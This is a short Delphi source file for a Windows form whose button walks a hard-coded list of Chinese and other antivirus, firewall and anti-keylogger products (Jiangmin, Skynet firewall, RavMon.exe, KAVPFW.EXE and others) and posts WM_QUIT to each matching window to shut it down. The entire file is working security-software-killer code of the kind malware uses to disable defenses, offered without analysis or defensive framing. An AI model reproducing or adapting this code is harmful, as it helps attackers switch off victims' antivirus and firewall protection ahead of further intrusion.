unit killlist;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    ListBox1: TListBox;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

  procls: array[0..10] of String = ('江民杀毒软件', '天网防火墙个人版',
    '天网防火墙企业版', 'LockDown', 'PasswordGuard.exe', 'EGHOST.EXE',
    'Iparmor.exe', 'MAILMON.EXE', 'KAVPFW.EXE', 'KV2004', 'RavMon.exe');

procedure My_KillForm(S: String);

implementation

{$R *.dfm}

procedure My_KillForm(S: String);
var
  Exehandle: Thandle;
begin
  ExeHandle := FindWindow(nil, PChar(S));
  if ExeHandle <> 0 then
    PostMessage(ExeHandle, WM_Quit, 0, 0);
end;

procedure TForm1.Button1Click(Sender: TObject);
var
  i: Integer;
begin
  for i := 0 to 10 do
  begin
    listbox1.Items.Add(procls[i]);
    try
      my_killform(procls[i]);
    finally
    end;
  end;
end;

end.

